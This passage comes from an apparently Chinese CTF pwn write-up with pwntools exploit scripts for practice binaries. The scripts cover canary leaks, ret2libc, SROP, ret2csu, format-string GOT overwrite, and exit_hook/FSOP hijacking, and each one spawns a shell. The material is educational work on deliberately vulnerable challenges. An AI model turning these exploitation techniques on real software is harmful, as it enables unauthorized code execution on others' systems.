<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./baby_canary&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./baby_canary&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#canary泄露,之后ret2libc即可</span></span><br><span class="line">offset = <span class="number">0x40</span></span><br><span class="line">payload1 = <span class="string">b&#x27;A&#x27;</span>*offset + <span class="string">b&#x27;A&#x27;</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;who you are?&#x27;</span>)</span><br><span class="line">io.send(payload1)</span><br><span class="line"></span><br><span class="line">io.recvuntil(payload1)</span><br><span class="line">canary = u32(io.recv(<span class="number">3</span>).rjust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;canary ===&gt; &#x27;</span>+<span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line"><span class="comment">#attach(io)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;come there for?&#x27;</span>)</span><br><span class="line">payload2 = <span class="string">b&#x27;A&#x27;</span>*offset + p32(canary) + <span class="string">b&#x27;A&#x27;</span>*<span class="number">12</span> + p32(puts_plt) + p32(<span class="number">0x8049238</span>) + p32(puts_got)</span><br><span class="line">io.send(payload2)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;get the flag!\n&#x27;</span>)</span><br><span class="line">puts = u32(io.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;puts ===&gt; &#x27;</span>+<span class="built_in">hex</span>(puts))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts)</span><br><span class="line">libcbase = puts - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">sys = libcbase + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh = libcbase + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload3 = <span class="string">b&#x27;A&#x27;</span>*offset + p32(canary) + <span class="string">b&#x27;A&#x27;</span>*<span class="number">12</span> + p32(sys) + <span class="string">b&#x27;AAAA&#x27;</span>  + p32(bin_sh)</span><br><span class="line">io.send(payload3)</span><br><span class="line">io.send(payload3)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div>

<h2 id="task02"><a href="#task02" class="headerlink" title="task02"></a>task02</h2><h3 id="0x01-ciscn-2019-c-1-ret2libc"><a href="#0x01-ciscn-2019-c-1-ret2libc" class="headerlink" title="0x01.ciscn_2019_c_1( ret2libc )"></a>0x01.ciscn_2019_c_1( ret2libc )</h3><p><code>checksec</code>看到程序为64位，开启了 partial relro 和 NX</p>
<p>程序是一个加密机，只有<code>encrypt</code>，没有<code>decrypt</code>，进入<code>encrypt</code>函数中</p>
<p>可以看到直接用<code>gets</code>函数来读取字符串，但是在函数返回之前会被修改，因此需要绕过修改，<code>strlen</code>是通过<code>\x00</code>判断是否到达字符串结尾的，直接在字符串开始位置写入<code>\x00</code>就可以使长度判断为0，从而绕过加密，直接构造栈。</p>
<p>先用<code>puts</code>函数泄露出<code>libc</code>地址，然后<code>ret2libc</code>直接getshell</p>
<p>exp为：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#io = remote(&#x27;node4.buuoj.cn&#x27;,25055)</span></span><br><span class="line">io = process(<span class="string">&#x27;ciscn_2019_c_1&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./ciscn_2019_c_1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">encrypt = <span class="number">0x4009a0</span></span><br><span class="line">offset = <span class="number">0x50</span>+<span class="number">8</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pop_rdi = <span class="number">0x400c83</span></span><br><span class="line">ret = <span class="number">0x4006b9</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#\x00绕过加密，ret2libc得到shell</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;choice!\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;encrypted\n&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span> + <span class="string">b&#x27;A&#x27;</span>*(offset-<span class="number">1</span>) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(encrypt)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Ciphertext\n\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;puts ===&gt; &#x27;</span>+<span class="built_in">hex</span>(puts))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts)</span><br><span class="line">libcbase = puts - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">sys = libcbase + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh = libcbase + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;encrypted\n&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span> + <span class="string">b&#x27;A&#x27;</span>*(offset-<span class="number">1</span>) + p64(ret) + p64(pop_rdi) + p64(bin_sh) + p64(sys)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div>

<h3 id="0x02-ciscn-2019-s-3-ret2csu-SROP"><a href="#0x02-ciscn-2019-s-3-ret2csu-SROP" class="headerlink" title="0x02.ciscn_2019_s_3( ret2csu | SROP )"></a>0x02.ciscn_2019_s_3( ret2csu | SROP )</h3><p><code>checksec</code>看到只开启了 NX 和 partial relro</p>
<p><code>sys_read</code>超大溢出，<code>gadgets</code>里面有系统调用号15<code>rt_sigreturn</code>，对应系统调用，而且在后面还能看到59号系统调用<code>execve</code></p>
<p>因此就会有两种思路，一种是SROP，另一种是ret2csu</p>
<h4 id="思路一：SROP"><a href="#思路一：SROP" class="headerlink" title="思路一：SROP"></a>思路一：SROP</h4><p>看汇编可以发现其实vuln函数没有一般函数应该有的 <code>leave</code> 操作，因此覆盖0x10个字节就够了</p>
<p>具体过程是先利用write泄露出栈中的已有数据来定位栈地址，并在栈中写入<code>/bin/sh</code>，覆盖返回地址为vuln函数，第二次直接用pwntools自带的SigreturnFrame控制寄存器为要getshell的布局，然后rop先到<code>mov rax, 0f</code> , 再<code>syscall</code>，后面加上SigreturnFrame</p>
<p>exp为：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line"><span class="comment">#io = remote(&quot;node4.buuoj.cn&quot;,26290)</span></span><br><span class="line">io = process(<span class="string">&#x27;./ciscn_s_3&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./ciscn_s_3&#x27;</span>)</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#attach(io)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">vuln = <span class="number">0x4004ed</span></span><br><span class="line">payload1 = <span class="string">b&#x27;/bin/sh\x00&#x27;</span>*<span class="number">2</span> + p64(vuln)</span><br><span class="line">io.send(payload1)</span><br><span class="line"></span><br><span class="line">io.recv(<span class="number">0x20</span>)</span><br><span class="line">leak_stack = u64(io.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;leak_stack ===&gt; &quot;</span>+<span class="built_in">hex</span>(leak_stack))</span><br><span class="line">bin_sh = leak_stack - <span class="number">0x148</span></span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = <span class="number">0x3b</span></span><br><span class="line">frame.rdi = bin_sh</span><br><span class="line">frame.rsi = <span class="number">0</span></span><br><span class="line">frame.rdx = <span class="number">0</span></span><br><span class="line">frame.rip = <span class="number">0x400517</span></span><br><span class="line"></span><br><span class="line">sigreturn = <span class="number">0x4004da</span></span><br><span class="line">syscall = <span class="number">0x400517</span></span><br><span class="line">payload2 = <span class="string">b&#x27;/bin/sh\x00&#x27;</span>*<span class="number">2</span> +p64(sigreturn) + p64(syscall) + <span class="built_in">bytes</span>(frame)</span><br><span class="line">io.send(payload2)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div>

<h4 id="思路二：ret2csu"><a href="#思路二：ret2csu" class="headerlink" title="思路二：ret2csu"></a>思路二：ret2csu</h4><p>利用<code>mov rax, 3b      ret</code>和<code>syscall</code>，再结合<code>__libc_csu_init</code>里面的gadgets进行rop</p>
<p>exp为：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#io = remote(&quot;node4.buuoj.cn&quot;,25834)</span></span><br><span class="line">io = process(<span class="string">&#x27;./ciscn_s_3&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./ciscn_s_3&#x27;</span>)</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x10</span></span><br><span class="line">csu_gadget1 = <span class="number">0x400596</span></span><br><span class="line">csu_gadget2 = <span class="number">0x400580</span></span><br><span class="line">vuln = <span class="number">0x4004ed</span></span><br><span class="line">syscall = <span class="number">0x400517</span></span><br><span class="line">execve = <span class="number">0x4004e2</span></span><br><span class="line">pop_rdi = <span class="number">0x4005a3</span></span><br><span class="line">ret = <span class="number">0x4003a9</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#attach(io)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">csu_payload</span>(<span class="params">rdi, rsi, rdx, r12, ret_addr</span>):</span><br><span class="line">    payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + p64(execve)</span><br><span class="line">    payload += p64(csu_gadget1)</span><br><span class="line">    payload += <span class="string">b&#x27;A&#x27;</span>*<span class="number">8</span>             <span class="comment">#add esp, 8</span></span><br><span class="line">    payload += p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(r12) + p64(rdx) + p64(rsi) + p64(rdi)  <span class="comment">#rdx rbp r12 r13 r14 r15</span></span><br><span class="line">    payload += p64(csu_gadget2)</span><br><span class="line">    payload += <span class="string">b&#x27;A&#x27;</span>*<span class="number">56</span></span><br><span class="line">    payload += p64(ret_addr)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;/bin/sh\x00&#x27;</span>*<span class="number">2</span> + p64(vuln)</span><br><span class="line">io.send(payload1)</span><br><span class="line">io.recv(<span class="number">0x20</span>)</span><br><span class="line">leak_stack = u64(io.recv(<span class="number">8</span>))</span><br><span class="line">bin_sh = leak_stack - <span class="number">0x148</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;bin_sh ===&gt; &quot;</span>+<span class="built_in">hex</span>(bin_sh))</span><br><span class="line"></span><br><span class="line">payload2 = csu_payload(bin_sh,<span class="number">0</span>,<span class="number">0</span>,bin_sh+<span class="number">8</span>,execve)</span><br><span class="line">io.send(payload2 + p64(ret) + p64(pop_rdi) + p64(bin_sh) + p64(syscall))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div>

<h3 id="0x03-BJDCTF-2nd-r2t4-got-hijack"><a href="#0x03-BJDCTF-2nd-r2t4-got-hijack" class="headerlink" title="0x03.[BJDCTF 2nd]r2t4( got hijack )"></a>0x03.[BJDCTF 2nd]r2t4( got hijack )</h3><p><code>checksec</code>看到开了NX和canary，partial relro</p>
<p>只有格式化字符串，那就是修改got表，printf后面要执行的函数就只有一个__stack_chk_fail函数，修改该函数got表为backdoor地址即可</p>
<p>exp为：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#io = remote(&#x27;node4.buuoj.cn&#x27;,26759)</span></span><br><span class="line">io = process(<span class="string">&#x27;./r2t4&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./r2t4&#x27;</span>)</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">attach(io)</span><br><span class="line">pause()</span><br><span class="line">backdoor = <span class="number">0x400626</span></span><br><span class="line">offset = <span class="number">6</span></span><br><span class="line">payload = <span class="string">b&#x27;%6c%10$hhn%32c%11$hhn%26c%12$hhn&#x27;</span> + p64(<span class="number">0x601019</span>) + p64(<span class="number">0x601018</span>) + p64(<span class="number">0x60101a</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">100</span>,<span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div>

<h2 id="task03"><a href="#task03" class="headerlink" title="task03"></a>task03</h2><h3 id="0x01-ciscn-2019-n-7-exit-hook劫持-FSOP"><a href="#0x01-ciscn-2019-n-7-exit-hook劫持-FSOP" class="headerlink" title="0x01.ciscn_2019_n_7( exit_hook劫持  | FSOP)"></a>0x01.ciscn_2019_n_7( exit_hook劫持  | FSOP)</h3><h4 id="思路一：exit-hook劫持"><a href="#思路一：exit-hook劫持" class="headerlink" title="思路一：exit_hook劫持"></a>思路一：exit_hook劫持</h4><p><code>checksec</code>看到保护全开</p>
<p>看起来好像是个堆题，但是没有对于堆漏洞的利用</p>
<p>输入666可以泄露出libc地址</p>
<p>程序首先会分配0x18大小的内存，在所分配内存的前8个字节存储<code>string_length</code>，后0x10字节为<code>string</code>，但是最后8个字节会在edit时产生任意地址写漏洞，可以利用<code>one_gadget</code>，因为我们无法主动执行<code>malloc</code>和<code>free</code>函数，因此劫持<code>exit_hook</code></p>
<p>exp如下：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#exit_hook劫持</span></span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29322</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./ciscn_2019_n_7&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./ciscn_2019_n_7&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choose</span>(<span class="params">choice</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Your choice-&gt; \n&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(choice))</span><br><span class="line"></span><br><span class="line"><span class="comment">#attach(io)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">choose(<span class="number">666</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">puts = <span class="built_in">int</span>(io.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;puts ===&gt; &#x27;</span>+<span class="built_in">hex</span>(puts))</span><br><span class="line"></span><br><span class="line">libcbase = puts - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libcbase ===&gt; &#x27;</span>+<span class="built_in">hex</span>(libcbase))</span><br><span class="line"></span><br><span class="line">one_gadget = libcbase + <span class="number">0xf1147</span></span><br><span class="line">exit_hook = libcbase + <span class="number">0x5f0040</span> + <span class="number">3848</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;exit_hook ===&gt; &#x27;</span>+<span class="built_in">hex</span>(exit_hook))</span><br><span class="line">log.success(<span class="string">&#x27;one_gadget ===&gt; &#x27;</span>+<span class="built_in">hex</span>(one_gadget))</span><br><span class="line"></span><br><span class="line">choose(<span class="number">1</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Length: \n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">48</span>))</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;name:\n&#x27;</span>)</span><br><span class="line">io.send(<span class="string">b&#x27;A&#x27;</span>*<span class="number">8</span>+p64(exit_hook))</span><br><span class="line"></span><br><span class="line">choose(<span class="number">2</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;name:\n&#x27;</span>)</span><br><span class="line">io.send(<span class="string">b&#x27;A&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;contents:\n&#x27;</span>)</span><br><span class="line">io.send(p64(one_gadget)*<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h4 id="思路二：FSOP"><a href="#思路二：FSOP" class="headerlink" title="思路二：FSOP"></a>思路二：FSOP</h4><p>一个古老的技巧，只适用于libc-2.23及之前版本，libc-2.24下也可以使用，但需要使用<code>house of orange</code>（一种结合_IO_FILE的组合利用方式）</p>
<p>本题可以直接任意地址写，输入666泄露出libc基址后直接修改<code>io_stderr</code>结构体中的内容，然后正常退出即可（不要输入4退出，否则不会得到shell）</p>
<p>exp:</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./ciscn_2019_n_7&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./ciscn_2019_n_7&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">DEBUG</span>():</span><br><span class="line">    attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choose</span>(<span class="params">choice</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Your choice-&gt; \n&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(choice))</span><br><span class="line"></span><br><span class="line">choose(<span class="number">666</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">puts = <span class="built_in">int</span>(io.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;puts ===&gt; &#x27;</span>+<span class="built_in">hex</span>(puts))</span><br><span class="line"></span><br><span class="line">libcbase = puts - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libcbase ===&gt; &#x27;</span>+<span class="built_in">hex</span>(libcbase))</span><br><span class="line">_IO_list_all = libcbase + libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;_IO_list_all ===&gt; &#x27;</span>+<span class="built_in">hex</span>(_IO_list_all))</span><br><span class="line">one_gadget = [<span class="number">0x45216</span>, <span class="number">0x4526a</span>, <span class="number">0xf02a4</span>, <span class="number">0xf1147</span>]</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Your choice-&gt; \n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Input string Length: \n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">0x100</span>).encode())</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Author name:&#x27;</span>)</span><br><span class="line">io.send(<span class="string">b&#x27;Static&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#修改io_stderr</span></span><br><span class="line">io_stderr = _IO_list_all+<span class="number">0x20</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Your choice-&gt; \n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;New Author name:\n&#x27;</span>)</span><br><span class="line">io.send(<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x8</span>+p64(io_stderr))</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;New contents:&#x27;</span>)</span><br><span class="line">fake_io = <span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="number">0</span>)*<span class="number">4</span>+p64(libcbase+libc.symbols[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line">fake_io = fake_io.ljust(<span class="number">0xd8</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(io_stderr+<span class="number">0x10</span>)</span><br><span class="line">io.send(fake_io)</span><br><span class="line"></span><br><span class="line">io.sendline(<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div>

<p>关于FSOP，在libc-2.23下由于对vtable没有任何检查，导致可以通过伪造而调用自己想要调用的函数，具体调用方式为<code>exit()</code>函数中的<code>_IO_flush_all_lockp ()</code>函数，其会刷新<code>_IO_list_all</code>链表中的所有文件流，并且会调用<code>_IO_OVERFLOW</code>函数指针，函数调用具体逻辑为：</p>
